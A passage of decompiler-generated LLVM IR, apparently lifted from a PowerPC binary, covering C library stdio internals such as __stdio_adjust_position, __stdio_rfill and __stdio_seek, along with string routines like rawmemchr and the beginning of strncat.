  %v0_1000e814 = phi i32 [ 0, %entry ], [ %v1_1000e7dc, %dec_label_pc_1000e7d8 ], [ %v0_1000e814.pre, %dec_label_pc_1000e800 ]
  store i32 %v0_1000e7b0, i32* @r31, align 4
  ret i32 %v0_1000e814

; uselistorder directives
  uselistorder i16 %v2_1000e7e8, { 1, 0 }
  uselistorder i32 %v1_1000e7dc, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e804, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e800, { 1, 0 }
  uselistorder label %dec_label_pc_1000e7d8, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000e830 = load i16, i16* %arg1, align 2
  %v4_1000e830 = zext i16 %v3_1000e830 to i32
  %tmp9 = urem i16 %v3_1000e830, 4
  %v3_1000e834 = icmp eq i16 %tmp9, 0
  br i1 %v3_1000e834, label %dec_label_pc_1000e880, label %dec_label_pc_1000e83c

dec_label_pc_1000e83c:                            ; preds = %entry
  %v1_1000e834 = zext i16 %tmp9 to i32
  %v1_1000e83c = add nsw i32 %v1_1000e834, -1
  store i32 %v1_1000e83c, i32* %r10.global-to-local, align 4
  %v4_1000e83c = icmp eq i32 %v1_1000e83c, 0
  br i1 %v4_1000e83c, label %dec_label_pc_1000e880, label %dec_label_pc_1000e844

dec_label_pc_1000e844:                            ; preds = %dec_label_pc_1000e83c
  %v1_1000e844 = and i32 %v4_1000e830, 2048
  %v3_1000e844 = icmp eq i32 %v1_1000e844, 0
  br i1 %v3_1000e844, label %dec_label_pc_1000e880, label %dec_label_pc_1000e84c

dec_label_pc_1000e84c:                            ; preds = %dec_label_pc_1000e844
  %v2_1000e84c = icmp sgt i32 %v1_1000e83c, 1
  br i1 %v2_1000e84c, label %dec_label_pc_1000e8f8, label %dec_label_pc_1000e854

dec_label_pc_1000e854:                            ; preds = %dec_label_pc_1000e84c
  %v2_1000e854 = add i32 %tmp, 40
  %v3_1000e854 = inttoptr i32 %v2_1000e854 to i32*
  %v4_1000e854 = load i32, i32* %v3_1000e854, align 4
  %v3_1000e858 = icmp eq i32 %v4_1000e854, 0
  br i1 %v3_1000e858, label %dec_label_pc_1000e860, label %dec_label_pc_1000e8f8

dec_label_pc_1000e860:                            ; preds = %dec_label_pc_1000e854
  %v2_1000e860 = add i32 %tmp, 44
  %v3_1000e860 = inttoptr i32 %v2_1000e860 to i32*
  %v4_1000e860 = load i32, i32* %v3_1000e860, align 4
  %v2_1000e864 = add i32 %tmp, 3
  %v3_1000e864 = inttoptr i32 %v2_1000e864 to i8*
  %v4_1000e864 = load i8, i8* %v3_1000e864, align 1
  %v5_1000e864 = zext i8 %v4_1000e864 to i32
  %v2_1000e86c = sub nsw i32 %v1_1000e83c, %v5_1000e864
  %v1_1000e870 = add nsw i32 %v2_1000e86c, -1
  store i32 %v1_1000e870, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000e860, 1
  br i1 %tmp7, label %dec_label_pc_1000e880, label %dec_label_pc_1000e878

dec_label_pc_1000e878:                            ; preds = %dec_label_pc_1000e860
  %v2_1000e878 = add i32 %tmp, 2
  %v3_1000e878 = inttoptr i32 %v2_1000e878 to i8*
  %v4_1000e878 = load i8, i8* %v3_1000e878, align 1
  %v5_1000e878 = zext i8 %v4_1000e878 to i32
  %v2_1000e87c = sub nsw i32 %v1_1000e870, %v5_1000e878
  store i32 %v2_1000e87c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e880

dec_label_pc_1000e880:                            ; preds = %dec_label_pc_1000e860, %dec_label_pc_1000e844, %dec_label_pc_1000e83c, %entry, %dec_label_pc_1000e878
  %v0_1000e8a4 = phi i32 [ %v1_1000e870, %dec_label_pc_1000e860 ], [ %v1_1000e83c, %dec_label_pc_1000e844 ], [ 0, %dec_label_pc_1000e83c ], [ 0, %entry ], [ %v2_1000e87c, %dec_label_pc_1000e878 ]
  %v1_1000e880 = and i32 %v4_1000e830, 64
  %v3_1000e880 = icmp eq i32 %v1_1000e880, 0
  %storemerge.in.in.v = select i1 %v3_1000e880, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1000e894 = add i32 %tmp, 16
  %v3_1000e894 = inttoptr i32 %v2_1000e894 to i32*
  %v4_1000e894 = load i32, i32* %v3_1000e894, align 4
  %v1_1000e898 = inttoptr i32 %arg2 to i32*
  %v2_1000e898 = load i32, i32* %v1_1000e898, align 4
  store i32 %v2_1000e898, i32* %r4.global-to-local, align 4
  %v2_1000e89c = sub i32 %storemerge, %v4_1000e894
  %v1_1000e8a0 = add i32 %arg2, 4
  %v2_1000e8a0 = inttoptr i32 %v1_1000e8a0 to i32*
  %v3_1000e8a0 = load i32, i32* %v2_1000e8a0, align 4
  store i32 %v3_1000e8a0, i32* %r5.global-to-local, align 4
  %v2_1000e8a4 = add i32 %v2_1000e89c, %v0_1000e8a4
  store i32 %v2_1000e8a4, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1000e8a4, 0
  %v1_1000e8ac = zext i1 %tmp10 to i32
  %v2_1000e8ac = ashr i32 %v2_1000e8a4, 31
  %v3_1000e8ac = and i32 %v2_1000e8ac, -2
  %v4_1000e8ac = or i32 %v3_1000e8ac, %v1_1000e8ac
  %v2_1000e8b0 = sub i32 %v3_1000e8a0, %v2_1000e8a4
  %v3_1000e8b0 = sub i32 -1, %v2_1000e8a4
  store i32 %v2_1000e8b0, i32* %r10.global-to-local, align 4
  %v6_1000e8b0 = icmp ule i32 %v2_1000e8b0, %v3_1000e8b0
  %v2_1000e8b4 = sub nsw i32 -1, %v4_1000e8ac
  %v3_1000e8b4 = add i32 %v2_1000e898, %v2_1000e8b4
  %v5_1000e8b4 = zext i1 %v6_1000e8b0 to i32
  %v6_1000e8b4 = add i32 %v3_1000e8b4, %v5_1000e8b4
  store i32 %v6_1000e8b4, i32* %v1_1000e898, align 4
  %v0_1000e8bc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e8bc = load i32, i32* @r8, align 4
  %v2_1000e8bc = add i32 %v1_1000e8bc, 4
  %v3_1000e8bc = inttoptr i32 %v2_1000e8bc to i32*
  store i32 %v0_1000e8bc, i32* %v3_1000e8bc, align 4
  %v0_1000e8c0 = load i32, i32* @r8, align 4
  %v1_1000e8c0 = inttoptr i32 %v0_1000e8c0 to i32*
  %v2_1000e8c0 = load i32, i32* %v1_1000e8c0, align 4
  %v1_1000e8c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_1000e8c4 = icmp sgt i32 %v2_1000e8c0, %v1_1000e8c4
  br i1 %v3_1000e8c4, label %dec_label_pc_1000e8dc, label %dec_label_pc_1000e8cc

dec_label_pc_1000e8cc:                            ; preds = %dec_label_pc_1000e880
  %v4_1000e8c4 = icmp eq i32 %v2_1000e8c0, %v1_1000e8c4
  br i1 %v4_1000e8c4, label %dec_label_pc_1000e8d0, label %dec_label_pc_1000e8e0thread-pre-split

dec_label_pc_1000e8d0:                            ; preds = %dec_label_pc_1000e8cc
  %v1_1000e8d0 = add i32 %v0_1000e8c0, 4
  %v2_1000e8d0 = inttoptr i32 %v1_1000e8d0 to i32*
  %v3_1000e8d0 = load i32, i32* %v2_1000e8d0, align 4
  %v1_1000e8d4 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000e8d4 = icmp ugt i32 %v3_1000e8d0, %v1_1000e8d4
  br i1 %v3_1000e8d4, label %dec_label_pc_1000e8dc, label %dec_label_pc_1000e8e0thread-pre-split

dec_label_pc_1000e8dc:                            ; preds = %dec_label_pc_1000e8d0, %dec_label_pc_1000e880
  %v0_1000e8dc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e8dc = sub i32 0, %v0_1000e8dc
  store i32 %v1_1000e8dc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e8e0

dec_label_pc_1000e8e0thread-pre-split:            ; preds = %dec_label_pc_1000e8cc, %dec_label_pc_1000e8d0
  %v0_1000e8e0.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e8e0

dec_label_pc_1000e8e0:                            ; preds = %dec_label_pc_1000e8e0thread-pre-split, %dec_label_pc_1000e8dc
  %v0_1000e8e0 = phi i32 [ %v0_1000e8e0.pr, %dec_label_pc_1000e8e0thread-pre-split ], [ %v1_1000e8dc, %dec_label_pc_1000e8dc ]
  %tmp8 = icmp sgt i32 %v0_1000e8e0, -1
  br i1 %tmp8, label %dec_label_pc_1000e8fc, label %dec_label_pc_1000e8e8

dec_label_pc_1000e8e8:                            ; preds = %dec_label_pc_1000e8e0
  %v0_1000e8e8 = call i32 @__errno_location()
  %v2_1000e8f0 = inttoptr i32 %v0_1000e8e8 to i32*
  store i32 75, i32* %v2_1000e8f0, align 4
  %v0_1000e900.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e8fc

dec_label_pc_1000e8f8:                            ; preds = %dec_label_pc_1000e854, %dec_label_pc_1000e84c
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e8fc

dec_label_pc_1000e8fc:                            ; preds = %dec_label_pc_1000e8e0, %dec_label_pc_1000e8e8, %dec_label_pc_1000e8f8
  %v0_1000e900 = phi i32 [ %v0_1000e8e0, %dec_label_pc_1000e8e0 ], [ %v0_1000e900.pre, %dec_label_pc_1000e8e8 ], [ -1, %dec_label_pc_1000e8f8 ]
  ret i32 %v0_1000e900

; uselistorder directives
  uselistorder i32 %v2_1000e8c0, { 1, 0 }
  uselistorder i32 %v2_1000e8a4, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32 2048, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000e8fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e8e0thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000e880, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000e914 = load i32, i32* @lr, align 4
  store i32 %v0_1000e914, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000e928 = add i32 %arg1, 8
  %v2_1000e928 = inttoptr i32 %v1_1000e928 to i32*
  %v3_1000e928 = load i32, i32* %v2_1000e928, align 4
  %v1_1000e92c = add i32 %arg1, 12
  %v2_1000e92c = inttoptr i32 %v1_1000e92c to i32*
  %v3_1000e92c = load i32, i32* %v2_1000e92c, align 4
  %v2_1000e930 = sub i32 %v3_1000e92c, %v3_1000e928
  store i32 268495160, i32* @lr, align 4
  %v3_1000e934 = inttoptr i32 %v3_1000e928 to i16*
  %v4_1000e934 = call i32 @__stdio_READ(i16* %v3_1000e934, i32 %v2_1000e930, i32 %v2_1000e930)
  %v0_1000e938 = load i32, i32* @r29, align 4
  %v1_1000e938 = add i32 %v0_1000e938, 8
  %v2_1000e938 = inttoptr i32 %v1_1000e938 to i32*
  %v3_1000e938 = load i32, i32* %v2_1000e938, align 4
  %v2_1000e93c = add i32 %v3_1000e938, %v4_1000e934
  store i32 %v2_1000e93c, i32* %r0.global-to-local, align 4
  %v2_1000e940 = add i32 %v0_1000e938, 16
  %v3_1000e940 = inttoptr i32 %v2_1000e940 to i32*
  store i32 %v3_1000e938, i32* %v3_1000e940, align 4
  %v0_1000e944 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e944 = load i32, i32* @r29, align 4
  %v2_1000e944 = add i32 %v1_1000e944, 20
  %v3_1000e944 = inttoptr i32 %v2_1000e944 to i32*
  store i32 %v0_1000e944, i32* %v3_1000e944, align 4
  store i32 %v0_1000e914, i32* %r0.global-to-local, align 4
  ret i32 %v4_1000e934

; uselistorder directives
  uselistorder i32 %v3_1000e938, { 1, 0 }
  uselistorder i32 %v4_1000e934, { 1, 0 }
  uselistorder i32 %v3_1000e928, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1000e964 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e970 = load i16, i16* %arg1, align 2
  %v4_1000e970 = zext i16 %v3_1000e970 to i32
  %v2_1000e974 = and i32 %v4_1000e970, %arg2
  %v5_1000e974 = icmp eq i32 %v2_1000e974, 0
  br i1 %v5_1000e974, label %dec_label_pc_1000e97c, label %dec_label_pc_1000e98c

dec_label_pc_1000e97c:                            ; preds = %entry
  %v1_1000e97c = and i32 %v4_1000e970, 2176
  %v3_1000e97c = icmp eq i32 %v1_1000e97c, 0
  br i1 %v3_1000e97c, label %dec_label_pc_1000e984, label %dec_label_pc_1000e998

dec_label_pc_1000e984:                            ; preds = %dec_label_pc_1000e97c
  %v2_1000e984 = or i32 %v4_1000e970, %arg2
  %v1_1000e988 = trunc i32 %v2_1000e984 to i16
  store i16 %v1_1000e988, i16* %arg1, align 2
  %v0_1000e98c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e98c

dec_label_pc_1000e98c:                            ; preds = %entry, %dec_label_pc_1000e984
  %v0_1000e98c = phi i32 [ %tmp, %entry ], [ %v0_1000e98c.pre, %dec_label_pc_1000e984 ]
  %v1_1000e98c = inttoptr i32 %v0_1000e98c to i16*
  %v2_1000e98c = load i16, i16* %v1_1000e98c, align 2
  %v3_1000e98c = zext i16 %v2_1000e98c to i32
  %v1_1000e990 = and i32 %v3_1000e98c, 16
  %v3_1000e990 = icmp eq i32 %v1_1000e990, 0
  br i1 %v3_1000e990, label %dec_label_pc_1000e9b4, label %dec_label_pc_1000e998

dec_label_pc_1000e998:                            ; preds = %dec_label_pc_1000e97c, %dec_label_pc_1000e98c
  %v0_1000e998 = call i32 @__errno_location()
  store i32 %v0_1000e998, i32* %r3.global-to-local, align 4
  %v2_1000e9a0 = inttoptr i32 %v0_1000e998 to i32*
  store i32 9, i32* %v2_1000e9a0, align 4
  br label %dec_label_pc_1000e9a4

dec_label_pc_1000e9a4:                            ; preds = %dec_label_pc_1000e9bc, %dec_label_pc_1000e998
  %v0_1000e9a4 = load i32, i32* @r31, align 4
  %v1_1000e9a4 = inttoptr i32 %v0_1000e9a4 to i16*
  %v2_1000e9a4 = load i16, i16* %v1_1000e9a4, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000e9ac = or i16 %v2_1000e9a4, 8
  br label %dec_label_pc_1000e9e8

dec_label_pc_1000e9b4:                            ; preds = %dec_label_pc_1000e98c
  %v1_1000e9b4 = and i32 %v3_1000e98c, 64
  %v3_1000e9b4 = icmp eq i32 %v1_1000e9b4, 0
  br i1 %v3_1000e9b4, label %dec_label_pc_1000e9dc, label %dec_label_pc_1000e9bc

dec_label_pc_1000e9bc:                            ; preds = %dec_label_pc_1000e9b4
  store i32 268495296, i32* @lr, align 4
  %v0_1000e9bc = call i32 @__stdio_wcommit()
  store i32 %v0_1000e9bc, i32* %r3.global-to-local, align 4
  %v3_1000e9c0 = icmp eq i32 %v0_1000e9bc, 0
  br i1 %v3_1000e9c0, label %dec_label_pc_1000e9c8, label %dec_label_pc_1000e9a4

dec_label_pc_1000e9c8:                            ; preds = %dec_label_pc_1000e9bc
  %v0_1000e9c8 = load i32, i32* @r31, align 4
  %v1_1000e9c8 = inttoptr i32 %v0_1000e9c8 to i16*
  %v2_1000e9c8 = load i16, i16* %v1_1000e9c8, align 2
  %v3_1000e9c8 = zext i16 %v2_1000e9c8 to i32
  %v1_1000e9cc = add i32 %v0_1000e9c8, 8
  %v2_1000e9cc = inttoptr i32 %v1_1000e9cc to i32*
  %v3_1000e9cc = load i32, i32* %v2_1000e9cc, align 4
  %v1_1000e9d0 = call i32 @__asm_rlwinm(i32 %v3_1000e9c8, i32 0, i32 26, i32 24)
  %v2_1000e9d0 = trunc i32 %v1_1000e9d0 to i16
  %v1_1000e9d4 = load i32, i32* @r31, align 4
  %v2_1000e9d4 = add i32 %v1_1000e9d4, 28
  %v3_1000e9d4 = inttoptr i32 %v2_1000e9d4 to i32*
  store i32 %v3_1000e9cc, i32* %v3_1000e9d4, align 4
  %v3_1000e9d8 = load i32, i32* @r31, align 4
  %v4_1000e9d8 = inttoptr i32 %v3_1000e9d8 to i16*
  store i16 %v2_1000e9d0, i16* %v4_1000e9d8, align 2
  %v0_1000e9dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e9dc

dec_label_pc_1000e9dc:                            ; preds = %dec_label_pc_1000e9b4, %dec_label_pc_1000e9c8
  %v0_1000e9dc = phi i32 [ %v0_1000e98c, %dec_label_pc_1000e9b4 ], [ %v0_1000e9dc.pre, %dec_label_pc_1000e9c8 ]
  %v1_1000e9dc = inttoptr i32 %v0_1000e9dc to i16*
  %v2_1000e9dc = load i16, i16* %v1_1000e9dc, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000e9e4 = or i16 %v2_1000e9dc, 1
  br label %dec_label_pc_1000e9e8

dec_label_pc_1000e9e8:                            ; preds = %dec_label_pc_1000e9a4, %dec_label_pc_1000e9dc
  %v2_1000e9e8 = phi i32 [ %v0_1000e9a4, %dec_label_pc_1000e9a4 ], [ %v0_1000e9dc, %dec_label_pc_1000e9dc ]
  %storemerge.off0 = phi i16 [ %v1_1000e9ac, %dec_label_pc_1000e9a4 ], [ %v1_1000e9e4, %dec_label_pc_1000e9dc ]
  %v3_1000e9e8 = inttoptr i32 %v2_1000e9e8 to i16*
  store i16 %storemerge.off0, i16* %v3_1000e9e8, align 2
  store i32 %v0_1000e964, i32* @r31, align 4
  %v0_1000e9fc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e9fc

; uselistorder directives
  uselistorder i32 %v4_1000e970, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 1 }
  uselistorder i32 26, { 4, 2, 5, 6, 3, 7, 8, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 64, { 6, 3, 4, 5, 2, 8, 9, 10, 7, 11, 0, 1 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e9e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e998, { 1, 0 }
  uselistorder label %dec_label_pc_1000e98c, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1000ea00 = load i32, i32* @lr, align 4
  store i32 %v0_1000ea00, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_1000ea0c = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1000ea18 = add i32 %arg1, 4
  %v2_1000ea18 = inttoptr i32 %v1_1000ea18 to i32*
  %v3_1000ea18 = load i32, i32* %v2_1000ea18, align 4
  %v2_1000ea1c = load i32, i32* %arg2, align 4
  %v1_1000ea20 = add i32 %tmp, 4
  %v2_1000ea20 = inttoptr i32 %v1_1000ea20 to i32*
  %v3_1000ea20 = load i32, i32* %v2_1000ea20, align 4
  store i32 268495400, i32* @lr, align 4
  %v4_1000ea24 = call i32 @__libc_lseek64(i32 %v3_1000ea18, i32 %v2_1000ea1c, i32 %v3_1000ea20, i32 %arg3)
  %v1_1000ea28 = icmp slt i32 %v4_1000ea24, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1000ea28, label %dec_label_pc_1000ea40, label %dec_label_pc_1000ea34

dec_label_pc_1000ea34:                            ; preds = %entry
  %v1_1000ea34 = load i32, i32* @r31, align 4
  %v2_1000ea34 = inttoptr i32 %v1_1000ea34 to i32*
  store i32 %v4_1000ea24, i32* %v2_1000ea34, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000ea3c = load i32, i32* @r31, align 4
  %v2_1000ea3c = add i32 %v1_1000ea3c, 4
  %v3_1000ea3c = inttoptr i32 %v2_1000ea3c to i32*
  store i32 %tmp, i32* %v3_1000ea3c, align 4
  %v0_1000ea40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ea40

dec_label_pc_1000ea40:                            ; preds = %entry, %dec_label_pc_1000ea34
  %v0_1000ea40 = phi i32 [ %tmp, %entry ], [ %v0_1000ea40.pre, %dec_label_pc_1000ea34 ]
  store i32 %v0_1000ea00, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ea0c, i32* @r31, align 4
  ret i32 %v0_1000ea40

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 3, 4, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_1000ea40, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000ea58 = urem i32 %arg1, 256
  store i32 %v1_1000ea58, i32* %r4.global-to-local, align 4
  %v0_1000ea701 = load i32, i32* @r3, align 4
  %v1_1000ea702 = urem i32 %v0_1000ea701, 4
  %v3_1000ea704 = icmp eq i32 %v1_1000ea702, 0
  br i1 %v3_1000ea704, label %dec_label_pc_1000ea78, label %dec_label_pc_1000ea60

dec_label_pc_1000ea60:                            ; preds = %entry, %dec_label_pc_1000ea60
  %v1_1000ea64 = phi i32 [ %v0_1000ea78.pre, %dec_label_pc_1000ea60 ], [ %v1_1000ea58, %entry ]
  %v0_1000ea60 = phi i32 [ %v1_1000ea6c, %dec_label_pc_1000ea60 ], [ %v0_1000ea701, %entry ]
  %v1_1000ea60 = inttoptr i32 %v0_1000ea60 to i8*
  %v2_1000ea60 = load i8, i8* %v1_1000ea60, align 1
  %v3_1000ea60 = zext i8 %v2_1000ea60 to i32
  %v4_1000ea64 = icmp eq i32 %v3_1000ea60, %v1_1000ea64
  %v0_1000ea68 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ea64, i32 %v0_1000ea68)
  %v0_1000ea6c = load i32, i32* @r3, align 4
  %v1_1000ea6c = add i32 %v0_1000ea6c, 1
  store i32 %v1_1000ea6c, i32* @r3, align 4
  %v1_1000ea70 = urem i32 %v1_1000ea6c, 4
  %v3_1000ea70 = icmp eq i32 %v1_1000ea70, 0
  %v0_1000ea78.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000ea70, label %dec_label_pc_1000ea78, label %dec_label_pc_1000ea60

dec_label_pc_1000ea78:                            ; preds = %dec_label_pc_1000ea60, %entry
  %v0_1000ea909 = phi i32 [ %v0_1000ea701, %entry ], [ %v1_1000ea6c, %dec_label_pc_1000ea60 ]
  %v0_1000ea78 = phi i32 [ %v1_1000ea58, %entry ], [ %v0_1000ea78.pre, %dec_label_pc_1000ea60 ]
  %v1_1000ea78 = mul i32 %v0_1000ea78, 256
  %v2_1000ea80 = or i32 %v1_1000ea78, %v0_1000ea78
  %v1_1000ea88 = mul i32 %v2_1000ea80, 65536
  %v2_1000ea8c = or i32 %v1_1000ea88, %v2_1000ea80
  br label %dec_label_pc_1000ea90

dec_label_pc_1000ea90:                            ; preds = %dec_label_pc_1000eafc, %dec_label_pc_1000ea90, %dec_label_pc_1000ea78
  %v0_1000eacc = phi i32 [ %v0_1000ea909, %dec_label_pc_1000ea78 ], [ %v1_1000ea94, %dec_label_pc_1000ea90 ], [ %v1_1000ea94, %dec_label_pc_1000eafc ]
  %v1_1000ea90 = inttoptr i32 %v0_1000eacc to i32*
  %v2_1000ea90 = load i32, i32* %v1_1000ea90, align 4
  %v1_1000ea94 = add i32 %v0_1000eacc, 4
  %v1_1000ea98 = add i32 %v0_1000eacc, 2
  %v2_1000ea9c = xor i32 %v2_1000ea90, %v2_1000ea8c
  %v1_1000eaa4 = add i32 %v2_1000ea9c, 2130640639
  %v2_1000eaa8 = xor i32 %v1_1000eaa4, %v2_1000ea9c
  %v1_1000eaac = add i32 %v0_1000eacc, 1
  %v2_1000eab0 = and i32 %v2_1000eaa8, -2130640640
  %v6_1000eab0 = icmp eq i32 %v2_1000eab0, -2130640640
  br i1 %v6_1000eab0, label %dec_label_pc_1000ea90, label %dec_label_pc_1000eabc

dec_label_pc_1000eabc:                            ; preds = %dec_label_pc_1000ea90
  %v2_1000eabc = inttoptr i32 %v0_1000eacc to i8*
  %v3_1000eabc = load i8, i8* %v2_1000eabc, align 1
  %v4_1000eabc = zext i8 %v3_1000eabc to i32
  %v1_1000eac0 = add i32 %v0_1000eacc, 3
  %v4_1000eac4 = icmp eq i32 %v4_1000eabc, %v0_1000ea78
  br i1 %v4_1000eac4, label %dec_label_pc_1000eacc, label %dec_label_pc_1000ead4

dec_label_pc_1000eacc:                            ; preds = %dec_label_pc_1000eabc
  ret i32 %v0_1000eacc

dec_label_pc_1000ead4:                            ; preds = %dec_label_pc_1000eabc
  %v2_1000ead4 = inttoptr i32 %v1_1000eaac to i8*
  %v3_1000ead4 = load i8, i8* %v2_1000ead4, align 1
  %v4_1000ead4 = zext i8 %v3_1000ead4 to i32
  %v4_1000ead8 = icmp eq i32 %v4_1000ead4, %v0_1000ea78
  br i1 %v4_1000ead8, label %dec_label_pc_1000eae0, label %dec_label_pc_1000eae8

dec_label_pc_1000eae0:                            ; preds = %dec_label_pc_1000ead4
  ret i32 %v1_1000eaac

dec_label_pc_1000eae8:                            ; preds = %dec_label_pc_1000ead4
  %v2_1000eae8 = inttoptr i32 %v1_1000ea98 to i8*
  %v3_1000eae8 = load i8, i8* %v2_1000eae8, align 1
  %v4_1000eae8 = zext i8 %v3_1000eae8 to i32
  %v4_1000eaec = icmp eq i32 %v4_1000eae8, %v0_1000ea78
  br i1 %v4_1000eaec, label %dec_label_pc_1000eaf4, label %dec_label_pc_1000eafc

dec_label_pc_1000eaf4:                            ; preds = %dec_label_pc_1000eae8
  ret i32 %v1_1000ea98

dec_label_pc_1000eafc:                            ; preds = %dec_label_pc_1000eae8
  %v2_1000eafc = inttoptr i32 %v1_1000eac0 to i8*
  %v3_1000eafc = load i8, i8* %v2_1000eafc, align 1
  %v4_1000eafc = zext i8 %v3_1000eafc to i32
  %v4_1000eb00 = icmp eq i32 %v4_1000eafc, %v0_1000ea78
  br i1 %v4_1000eb00, label %dec_label_pc_1000eb08, label %dec_label_pc_1000ea90

dec_label_pc_1000eb08:                            ; preds = %dec_label_pc_1000eafc
  ret i32 %v1_1000eac0

; uselistorder directives
  uselistorder i32 %v1_1000ea94, { 1, 0 }
  uselistorder i32 %v0_1000eacc, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_1000ea80, { 1, 0 }
  uselistorder i32 %v0_1000ea78, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000ea6c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000ea701, { 2, 1, 0 }
  uselistorder i32 %v1_1000ea58, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 10, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000ea60, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000eb14

dec_label_pc_1000eb14:                            ; preds = %dec_label_pc_1000eb14, %entry
  %v0_1000eb14 = phi i32 [ %v1_1000eb18, %dec_label_pc_1000eb14 ], [ %tmp, %entry ]
  %v1_1000eb14 = inttoptr i32 %v0_1000eb14 to i8*
  %v2_1000eb14 = load i8, i8* %v1_1000eb14, align 1
  %v1_1000eb18 = add i32 %v0_1000eb14, 1
  store i32 %v1_1000eb18, i32* %r11.global-to-local, align 4
  %v3_1000eb1c = icmp eq i8 %v2_1000eb14, 0
  store i1 %v3_1000eb1c, i1* %cr7_eq.global-to-local, align 1
